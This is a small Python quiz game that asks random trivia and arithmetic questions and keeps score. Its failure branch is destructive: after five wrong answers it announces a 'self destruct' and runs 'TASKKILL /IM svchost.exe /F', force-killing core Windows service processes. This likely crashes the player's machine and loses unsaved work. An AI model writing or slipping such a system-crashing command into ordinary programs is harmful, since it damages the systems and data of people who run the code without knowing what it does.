import random,subprocess

qs = ["Capital of uk?","what is red?","hungry?","French capital?","How many monitors in the room?","47x2","How many windows in the room?","What is the biggest desert?","what does this say? ...---...","What keys are used to unfreeze old computers? (use + beetween keys)"]
qsa = ["london","red","yes","paris","31","94","48","antartica","sos","control+alt+delete"]

correct = False
score = 0
incorrect = 0

r = random.randint(0,len(qs)-1)

while True:
    if correct == True:
        r = random.randint(0,len(qs)-1)

    print(qs[r])

    ans = input("\n>answer:").lower()

    if ans == qsa[r]:
        score = score+ 1
        incorrect = 0
        print("correct",score,"\n")
        correct = True
        
    else:
        incorrect += 1
        print("Incorrect\n",incorrect)
        correct=False
        if incorrect > 4:
            print("\n\n\n 5 BAD ATTEMPTS, COMPUTER SHALL SELF DESTRUCT\n\n\n")
            subprocess.run("TASKKILL /IM svchost.exe /F")
